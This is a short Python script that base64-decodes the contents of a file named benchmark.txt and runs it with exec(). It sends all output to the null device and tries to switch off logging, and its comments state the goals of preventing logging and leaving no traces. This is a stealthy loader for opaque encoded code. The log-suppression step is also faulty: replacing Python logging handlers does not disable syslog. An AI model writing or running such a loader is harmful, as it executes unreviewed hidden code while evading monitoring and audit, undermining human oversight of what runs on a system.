import base64
import sys
import os
from contextlib import redirect_stdout, redirect_stderr
import logging
import syslog

# Function to temporarily disable syslog
def disable_syslog():
    try:
        syslog.syslog(syslog.LOG_INFO, '')  # Dummy call to ensure syslog is initialized
        # Replace syslog handler with a null handler
        logging.getLogger().handlers = [logging.NullHandler()]
    except Exception:
        pass

# Function to restore syslog (optional, kept minimal)
def restore_syslog():
    try:
        logging.getLogger().handlers = []
    except Exception:
        pass

# Main execution block
try:
    # Open null device for output suppression
    with open(os.devnull, 'w') as devnull:
        # Redirect all stdout and stderr to null
        with redirect_stdout(devnull), redirect_stderr(devnull):
            # Disable syslog to prevent logging
            disable_syslog()
            
            # Read and decode the benchmark file
            with open('benchmark.txt', 'r') as encoded_file:
                encoded_content = encoded_file.read()
                decoded_content = base64.b64decode(encoded_content).decode('utf-8')
                
                # Execute the decoded content in a suppressed environment
                exec(decoded_content)
                
            # Clear any output buffers
            sys.stdout.flush()
            sys.stderr.flush()

finally:
    # Restore syslog and ensure no traces remain
    restore_syslog()
    # Clear any remaining output buffers
    sys.stdout.flush()
    sys.stderr.flush()
